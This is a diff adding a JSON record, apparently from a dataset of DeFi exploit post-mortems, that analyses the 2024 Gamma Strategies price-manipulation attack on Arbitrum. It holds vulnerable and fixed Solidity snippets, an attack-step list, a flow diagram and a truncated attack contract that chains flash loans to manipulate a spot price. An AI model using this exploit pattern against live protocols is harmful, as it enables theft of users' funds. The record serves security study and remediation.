@@ -1,0 +1,44 @@
+{
+ "id": "2024__2024-01-04_GammaStrategies_PriceManipulation_ARB",
+ "source_file": "2024/2024-01-04_GammaStrategies_PriceManipulation_ARB.md",
+ "title": "Gamma Strategies — Price Manipulation Attack Analysis",
+ "date": "2024-01-04",
+ "protocol": "Gamma Strategies",
+ "chain": "Arbitrum",
+ "loss_raw": "~$6,180,000 (official Gamma post-mortem; ~211.9 ETH + stablecoins)",
+ "loss_usd": 6180000.0,
+ "root_cause": "Use of Algebra AMM spot price during concentrated liquidity deposits — deposit amounts calculated using a manipulable real-time price without TWAP",
+ "attack_tx": "0x025c...be75",
+ "vulnerable_contract": "0x1F1C...123E",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code — using spot price as oracle\nfunction calculatePrice() internal returns (uint160) {\n    // Query the Algebra pool's current real-time price (manipulable)\n    I.GlobalState memory gs = I(algebra_pool).globalState();\n    // Multiply sqrtPriceX96 by a manipulation factor to create a manipulated price threshold\n    // Set to 85.572% level → induces swaps to pass in the attacker's desired direction\n    return (gs.price * 85_572) / 100_000;\n}",
+  "// ❌ Vulnerable code — slippage protection parameter set to zero\nuint256[4] memory empty_arr; // [0, 0, 0, 0]\n// Since all minIn values are 0, price checks are effectively disabled\nuint256 val = I(uniproxy).deposit(\n    1,              // token0 deposit amount (USDT, very small)\n    300_000_000_000, // token1 deposit amount (USDCe, 300,000)\n    address(this),\n    usdt_usdce_pool,\n    empty_arr        // ❌ minIn = [0,0,0,0] — no price floor\n);",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.22;\n\n// @KeyInfo - Total Lost : ~$6.3m\n// Attacker EOA  : 0x5351536145610aa448a8bf85ba97c71caf31909c\n// Attack Contract: 0xfd42cba85f6567fef32bab24179de21b9851b63e\n// Vulnerable Contract: 0x1F1Ca4e8236CD13032653391dB7e9544a6ad123E (Gamma UniProxy)\n// Attack Tx     : https://arbiscan.io/tx/0x025cf285...\n\ncontract GammaAttack {\n    // === Key Addresses ===\n    address constant uniproxy      = 0x1F1Ca4e8236CD13032653391dB7e9544a6ad123E; // Gamma Hypervisor (vulnerable contract)\n    address constant algebra_pool  = 0x3AB5DD69950a948c55D1FBFb7500BF92B4Bd4C48; // Algebra USDT/USDCe pool (price manipulation target)\n    address constant usdt_usdce_pool = 0x61A7b3dae70D943C6f2eA9ba4FfD2fEcc6AF15E4; // Gamma LP token (deposit/withdrawal target)\n    address constant weth_usdt_pool  = 0x641C00A822e8b671738d32a431a4Fb6074E5c79d; // Uniswap V3 (flash loan source)\n    address constant balancer        = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Balancer Vault (secondary flash loan)\n\n    // === Manipulated Price Calculation ===\n    // Multiply algebra_pool's current spot price by factor 0.85572 to set swap price limit\n    // → This value is calibrated so swaps complete in the attacker's desired direction\n    function calculatePrice() internal returns (uint160) {\n        I.GlobalState memory gs = I(algebra_pool).globalState(); // ❌ Query spot price\n        return (gs.price * 85_572) / 100_000;                   // ❌ Limit based on post-manipulation price\n    }\n\n    function testExploit() public {\n        // Step 1: Set approvals — allow Gamma Hypervisor to pull tokens\n        I(usdt).approve(usdt_usdce_pool, type(uint256).max);\n        I(usdce).approve(usdt_usdce_pool, type(uint256).max);\n\n        // Step 2: Borrow 3,000,000 USDT via Uniswap V3 flash loan\n        // → triggers uniswapV3FlashCallback callback\n        I(weth_usdt_pool).flash(address(this), 0, 3_000_000_000_000, \"\");\n\n        // Step 7: Realize profit — swap held USDCe → WETH\n        I(weth_usdce_pool).swap(address(this), false, int256(I(usdce).balanceOf(address(this))), ...);\n\n        // Step 8: Convert WETH → ETH\n        I(weth).withdraw(I(weth).balanceOf(address(this)));\n    }\n\n    // Uniswap V3 flash loan callback\n    function uniswapV3FlashCallback(uint256, uint256, bytes memory) public {\n        // Step 3: Additional flash loan of 2,000,000 USDCe from Balancer\n        // → triggers receiveFlashLoan callback\n        I(balancer).flashLoan(address(this), [usdce], [2_000_000_000_000], \"x\");\n\n        // Step 6: Final liquidation swap on Algebra with remaining USDT\n        I(algebra_pool).swap(address(this), true, 473_259_664_738, calculatePrice(), \"\");\n\n        // Repay flash loan (principal 3,000,000 + fee 1,500 USDT)\n        I(usdt).transfer(weth_usdt_pool, 3_001_500_000_000);\n    }\n\n    // Balancer flash loan callback — core attack loop\n    function receiveFlashLoan(address[] memory, uint256[] memory amounts, ...) public {\n        u"
+ ],
+ "code_after": [
+  "// ✅ Fixed code — using TWAP (Time-Weighted Average Price)\nfunction getSecurePrice() internal returns (uint160) {\n    // Use a minimum 30-minute (1800-second) TWAP as the oracle\n    // Cannot be manipulated within a single transaction\n    uint32[] memory secondsAgos = new uint32[](2);\n    secondsAgos[0] = 1800; // 30 minutes ago\n    secondsAgos[1] = 0;    // current\n\n    (int56[] memory tickCumulatives, ) = algebra_pool.getTimepoints(secondsAgos);\n    int56 tickDelta = tickCumulatives[1] - tickCumulatives[0];\n    int24 twapTick = int24(tickDelta / int56(uint56(1800)));\n\n    // tick → sqrtPriceX96 conversion\n    return TickMath.getSqrtRatioAtTick(twapTick);\n}",
+  "// ✅ Fixed code — enforced slippage protection\n// Block zero minIn inputs inside deposit()\nfunction deposit(\n    uint256 deposit0,\n    uint256 deposit1,\n    address to,\n    address pos,\n    uint256[4] memory minIn\n) external returns (uint256 shares) {\n    // ✅ Price protection: reject if all minIn values are zero\n    require(\n        minIn[0] > 0 || minIn[1] > 0 || minIn[2] > 0 || minIn[3] > 0,\n        \"Gamma: price protection required\"\n    );\n    // ... additionally validate price range using TWAP\n}"
+ ],
+ "steps": [
+  "USDT, USDCe → usdt_usdce_pool approve (unlimited)",
+  "15-iteration loop",
+  "① algebra_pool.swap(USDT→USDCe, large amount)",
+  "→ Push USDT/USDCe price to extreme",
+  "→ algebra_pool spot price manipulation complete",
+  "→ Excess shares minted based on manipulated price",
+  "→ Actual contributed value < value of minted shares",
+  "→ Withdraw tokens using excess shares",
+  "→ Profit realized (withdrawn amount > deposited)",
+  "④ algebra_pool.swap(USDCe→USDT, large amount)",
+  "→ Restore price to original range",
+  "→ Small deposit to prepare for next loop's price",
+  "(algebra_pool.swap: USDT→USDCe direction, 473,259 USDT)",
+  "weth_usdce_pool.swap: convert held USDCe → WETH"
+ ],
+ "other_code": [
+  "[Step 1] testExploit() executes\n│\n├─ USDT, USDCe → usdt_usdce_pool approve (unlimited)\n│\n└─ [Step 2] Flash loan request to Uniswap V3 (weth_usdt_pool)\n           Borrow 3,000,000 USDT\n           ↓ (triggers uniswapV3FlashCallback)\n\n[Step 3] uniswapV3FlashCallback() entered\n│\n├─ [Step 4] Flash loan request to Balancer\n│          Borrow 2,000,000 USDCe\n│          ↓ (triggers receiveFlashLoan)\n│\n│   [Step 5] receiveFlashLoan() entered — core attack loop\n│   │\n│   │  ┌─────────────────────────────────────────────────────────┐\n│   │  │  15-iteration loop                                       │\n│   │  │                                                         │\n│   │  │  ① algebra_pool.swap(USDT→USDCe, large amount)         │\n│   │  │    → Push USDT/USDCe price to extreme                   │\n│   "
+ ]
+}
